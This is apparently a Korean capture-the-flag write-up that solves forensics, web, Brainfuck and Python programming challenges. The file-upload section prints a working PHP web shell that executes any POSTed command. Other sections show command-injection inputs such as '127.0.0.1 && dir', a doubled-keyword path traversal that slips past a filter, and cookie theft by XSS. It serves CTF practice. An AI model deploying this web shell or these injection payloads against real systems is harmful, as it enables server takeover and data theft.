## Forensic - Hidden

### 문제
![Forensic - Hidden](/img/hidden-0.png)  
`clean.png` 파일에 숨겨진 플래그를 찾아야 한다.

### 풀이
![clean.png](/img/clean.png)  
파일의 정체는 귀여운 너구리 한 마리..!

이 파일을 vi 편집기로 열어보면?  
![Open clean.png from vi](/img/hidden-1.png)  
당연히 깨진다.

![vi xxd](/img/hidden-2.png)  
vi 편집기에서 `:%!xxd`를 입력하면?

![clean.png - Hex Code](/img/hidden-3.png)  
`clean.png`의 Hex code가 나온다.

여기서 플래그 형식의 일부인 `2nd`나 `CTF` 문자열을 검색하면?  
![Search Flag](/img/hidden-4.png)  
플래그를 찾을 수 있다.

<br/><br/>

## Web - file upload

### 문제
![Web - file upload](/img/file-upload-0.png)  
파일 업로드 취약점을 이용해 플래그를 알아내야 한다.

### 풀이
![Upload Page](/img/file-upload-1.png)  
여기도 ~~사나운~~ 귀여운 너구리 한 마리가 반겨준다..  
그리고 URL을 보면 해당 사이트가 PHP를 사용하는 것을 알 수 있다.

PHP로 웹셸을 작성 후  
```php
<?php
	$cmd = $_POST['cmd'];
	if ( isset($cmd) ) { $x = exec("$cmd", $output); }
	echo	"<form action='$_SERVER[PHP_SELF]' method='post'>".
			"<input type='text' name='cmd'/>".
		"</form><hr/>".
		"<pre>";
	foreach ($output as $o) {
		echo $o."<br/>";
	}
	echo	"</pre>";
?>
```
파일을 올리면

![Uplaod Path](/img/file-upload-3.png)  
친절하게도 파일이 업로드된 위치를 알려준다. ..?

이제 위 경로로 접속하면  
![Webshell](/img/file-upload-4.png)  
웹셸을 사용할 수 있다. 여기서 시스템 명령어를 사용하면 된다.

![Webshell - ls -lhA ../](/img/file-upload-5.png)  
`flag`라는 이름을 가진 파일을 찾았다.

이제 저 파일을 읽기만 하면 된다.  
![Webshell - cat ../flag](/img/file-upload-6.png)  
`flag` 파일의 위치를 브라우저로 접속해도 된다.

<br/><br/>

## Web - LFIv2

### 문제
![Web - LFIv2](/img/lfiv2-0.png)  
이번에도 친절하게 플래그가 적힌 파일의 위치까지 알려준다.

### 풀이
이 문제는 1분만에 풀었다.  
![webshell - cat /home/2ndctf/lfi_flag.txt](/img/lfiv2-1.png)  
`Web - file upload`에서 올린 웹셸을 이용해서..

### 진짜 풀이
![Search Page](/img/lfiv2-2.png)  
기본 화면이다.

콤보박스에서 목록 선택 후 view를  누르면 특정 파일의 내용을 불러온다.  
![Search 1.php](/img/lfiv2-3.png)  
여기서 중요한 건 폼이 `GET` 방식으로 전달되어 주소창에 보여진다는 것.  
즉, `filename=` 뒤에 적힌 경로의 파일을 불러온다는 뜻이다.

그럼 `filename=/home/2ndctf/lfi_flag.txt`로 변경하면?  
![Search lfi_flag.txt](/img/lfiv2-4.png)  
`flag`와 `home`이 필터링 되었다고 한다.

테스트를 위해 1flag.php로 해보자.  
![Search 1flag.php](/img/lfiv2-5.png)  
flag 문자열은 필터링 됐지만, 1.php의 파일 내용이 불러와진다.

그렇다는 것은 필터링된 문자열은 공백으로 바뀌었다는 뜻이니
![Search flflagag.php](/img/lfiv2-6.png)  
`/hohomeme/2ndctf/lfi_flflagag.txt`로 수정하면 플래그를 얻을 수 있다.

<br/><br/>

## Web - Command Injection

### 문제
![Web - Command Injection](/img/command-injection-0.png)  
플래그는 현재 디렉토리에 있다고 한다.

### 풀이
![Ping Page](/img/command-injection-1.png)  
Ping 서비스를 제공하는 페이지다.

제일 먼저 `ping` 명령어를 닫고 다른 명령어를 실행시켰더니  
![; ls](/img/command-injection-2.png)  
안된다.

그 다음 `ping` 명령어를 정상적으로 실행 후 다른 명령어를 실행하면  
![127.0.0.1 && ls](/img/command-injection-3.png)  
안된다. 하지만 `no hack!`은 없어졌다.  

그렇다면 `ls`가 아닌 ~~윈도우의 cmd에서 쓰이는 명령어인~~ `dir`을 입력해보자.  
리눅스에도 있는 명령어였네..  
![127.0.0.1 && dir](/img/command-injection-4.png)  
됐다. 현재 디렉토리에 `flag`와 `service.php` 파일이 있다는 것을 알아냈다.

이제 `127.0.0.1 && cat flag`를 입력하면?

<br/><br/>

안되더라.. 브라우저에서 해당 경로로 접속하자.  
![Open flag from Browser](/img/command-injection-5.png)  

<br/><br/>

## Web - XSS-1

### 문제
![Web - XSS-1](/img/xss-1-0.png)  
Cross Site Script.

### 풀이
![Main Page](/img/xss-1-1.png)  
첫 화면이다. login을 누르고 ~~회원가입 및~~ 로그인 후 게시판이 나오면 글쓰기를 눌러보자.

![document.cookie](/img/xss-1-2.png)  
자바스크립트 코드를 작성한 후 게시판에 해당 게시판에 들어가서

개발자 도구의 콘솔장을 보면  
![console log](/img/xss-1-3.png)  
쿠키가 출력되어 있다.

jwt = JSON Web Token  
점(.)을 기준으로 나누면 3개의 부분이 나오는데, 순서대로 헤더, 페이로드, 서명 부분이라고 한다.  
![javascript atob()](/img/xss-1-4.png)  
jwt는 Base64url로 인코딩 되기 때문에 `atob()`로 간단하게 디코딩할 수 있다.

<br/><br/>

## Web - XSS-2

### 문제
![Web - XSS-2](/img/xss-2-0.png)  
Cross Site Script 2.

### 풀이
`Web - XSS-1`와 같은 데이터베이스를 사용한다.  
위에서 작성한 글에 다시 접속해서 똑같은 작업을 한다.

![javascript atob()](/img/xss-2-1.png)  
여기서 결과는 다르게 나온다.

![javascript atob() * 3](/img/xss-2-2.png)  
`atob()`를 몇번 더 돌리니 플래그가 떴다.

<br/><br/>

![But...](/img/xss-1-5.png)  
사실 XSS-1에서는 XSS를 사용하지 않아도 개발자 도구에서 jwt를 찾을 수 있었다.

<br/><br/>

## Misc - BF

### 문제
![Misc - BF](/img/bf-0.png)  
BF가 뭘까.............  
ctf bf를 검색해보니 BrainFuck 라고, 8개의 문자만 이용해서 프로그래밍을 한다고 한다. ..

### 풀이
파일을 다운받고 열어보면  
![BF.txt](/img/bf-1.png)  
~~이게 진짜 프로그래밍..?~~

구글링을 하다가 [해석해주는 사이트](//kcal2845.github.io/bf_js/)를 찾았다.  
![kcal2845.github.io/bf_js/](/img/bf-2.png)

<br/><br/>

## Programming - Programming 1

### 문제
![Programming 1](/img/programming-1-0.png)  
플래그 형식이 주어진다.

### 풀이
파일을 다운받고 열어보면  
![problem.txt](/img/programming-1-1.png)  
문제가 나온다. 계산기를 쓰던 코딩을 하던 하면 될 것 같다.

파이썬 코드 작성 후  
```python
#!/usr/bin/env python3

a, b, c = 1598, 4987, 4565
p1 = a**2 + b + b*c

a, b, c = 94, 326548, 156487
p2 = (b+c)*a

a, b, c = 9487, 45896, 10624
p3 = a*b*c*100

print('2ndCTF{' + f'{p1}_{p2}_{p3}' + '}')
```
실행하면  
![python code - result](/img/programming-1-3.png)  
끝

<br/><br/>

## Programming - Programming 2

### 문제
![Programming 2](/img/programming-2-0.png)  

### 풀이
![problem.txt](/img/programming-2-1.png)  
인코딩된 결과가 모두 숫자인 것을 보면 ord() 함수로 인코딩한 ASCII 코드다  

ASCII 코드는 chr()를 사용하여 디코딩  
```python
#!/usr/bin/env python3

list = '50 110 100 67 84 70 123 65 115 99 105 105 95 101 78 99 111 68 101 114 95 72 111 119 95 68 101 99 48 100 49 110 103 63 125'.split(' ')

for i in list:
    print( chr(int(i)), end='' )
print()
```

코드 실행 결과  
![Python code - Result](/img/programming-2-3.png)

<br/><br/>

## Programming - Programming 4

### 문제
![Programming 4](/img/programming-4-0.png)  
소수 = 약수가 1과 자기 자신밖에 없는 수

### 풀이
코드 작성  
```python
#!/usr/bin/env python3

def f_cus(i):
    for j in range(2, int(i**1/2)+1):
        if i%j==0: return False
    return True

c = []
for i in range(2, 90001):
    if f_cus(i): c.append(i)

print( len(c) )
```

코드 실행 결과  
![Python code - Result](/img/programming-4-2.png)
